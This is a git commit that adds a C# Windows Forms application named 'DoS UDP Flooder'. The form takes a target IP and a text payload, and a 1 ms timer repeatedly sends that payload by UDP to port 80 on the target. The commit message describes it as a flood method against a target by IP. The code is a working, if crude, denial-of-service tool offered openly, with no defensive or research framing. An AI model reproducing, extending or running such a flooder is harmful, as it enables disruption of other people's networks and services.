0b66799fc6c730283573941568ac788d0dbf1a46
Keyo <72033670+kalhzino@users.noreply.github.com>
2021-02-10 18:28:56 -0300

    -> First try UDPFlooder
    Method flood to set multiple connections on target, by IP.

---
+++ DoS UDP Flooder/DoS UDP Flooder/Form1.Designer.cs
@@ -0,0 +1,130 @@
+﻿
+namespace DoS_UDP_Flooder
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Variável de designer necessária.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Limpar os recursos que estão sendo usados.
+        /// </summary>
+        /// <param name="disposing">true se for necessário descartar os recursos gerenciados; caso contrário, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Código gerado pelo Windows Form Designer
+
+        /// <summary>
+        /// Método necessário para suporte ao Designer - não modifique 
+        /// o conteúdo deste método com o editor de código.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.txtTgtIP = new System.Windows.Forms.TextBox();
+            this.txtTxt = new System.Windows.Forms.TextBox();
+            this.btnStart = new System.Windows.Forms.Button();
+            this.btnStop = new System.Windows.Forms.Button();
+            this.FlooderTimer = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(11, 25);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(51, 13);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Taget IP:";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(11, 71);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(25, 13);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "Txt.";
+            // 
+            // txtTgtIP
+            // 
+            this.txtTgtIP.Location = new System.Drawing.Point(79, 22);
+            this.txtTgtIP.Name = "txtTgtIP";
+            this.txtTgtIP.Size = new System.Drawing.Size(100, 20);
+            this.txtTgtIP.TabIndex = 2;
+            // 
+            // txtTxt
+            // 
+            this.txtTxt.Location = new System.Drawing.Point(79, 68);
+            this.txtTxt.Multiline = true;
+            this.txtTxt.Name = "txtTxt";
+            this.txtTxt.Size = new System.Drawing.Size(356, 248);
+            this.txtTxt.TabIndex = 3;
+            // 
+            // btnStart
+            // 
+            this.btnStart.Location = new System.Drawing.Point(454, 87);
+            this.btnStart.Name = "btnStart";
+            this.btnStart.Size = new System.Drawing.Size(103, 50);
+            this.btnStart.TabIndex = 4;
+            this.btnStart.Text = "Start";
+            this.btnStart.UseVisualStyleBackColor = true;
+            this.btnStart.Click += new System.EventHandler(this.btnStart_Click);
+            // 
+            // btnStop
+            // 
+            this.btnStop.Location = new System.Drawing.Point(454, 233);
+            this.btnStop.Name = "btnStop";
+            this.btnStop.Size = new System.Drawing.Size(103, 50);
+            this.btnStop.TabIndex = 5;
+            this.btnStop.Text = "Stop";
+            this.btnStop.UseVisualStyleBackColor = true;
+            this.btnStop.Click += new System.EventHandler(this.btnStop_Click);
+            // 
+            // FlooderTimer
+            // 
+            this.FlooderTimer.Interval = 1;
+            this.FlooderTimer.Tick += new System.EventHandler(this.FlooderTimer_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(603, 339);
+            this.Controls.Add(this.btnStop);
+            this.Controls.Add(this.btnStart);
+            this.Controls.Add(this.txtTxt);
+            this.Controls.Add(this.txtTgtIP);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox txtTgtIP;
+        private System.Windows.Forms.TextBox txtTxt;
+        private System.Windows.Forms.Button btnStart;
+        private System.Windows.Forms.Button btnStop;
+        private System.Windows.Forms.Timer FlooderTimer;
+    }
+}
+
---
+++ DoS UDP Flooder/DoS UDP Flooder/Form1.cs
@@ -0,0 +1,62 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+
+namespace DoS_UDP_Flooder
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void btnStart_Click(object sender, EventArgs e)
+        {
+            FlooderTimer.Start();
+        }
+
+        private void btnStop_Click(object sender, EventArgs e)
+        {
+            FlooderTimer.Stop();
+        }
+        public void Flood()
+        {
+            UdpClient target = new UdpClient();
+            IPAddress TgtIP = IPAddress.Parse(txtTgtIP.Text);
+            try
+            {
+                target.Connect(TgtIP, 80);
+                byte[] sendBytes = Encoding.ASCII.GetBytes(txtTxt.Text);
+                target.Send(sendBytes, sendBytes.Length);
+                target.AllowNatTraversal(true);
+                target.DontFragment = true;
+            }
+            catch
+            {
+                const string errorMsg = "something went wron...";
+                const string errorCaption = "make sure your data";
+                MessageBox.Show(errorMsg, errorCaption, MessageBoxButtons.OK);
+            }
+            
+        }
+
+        private void FlooderTimer_Tick(object sender, EventArgs e)
+        {
+            Flood();
+        }
+    }
+}
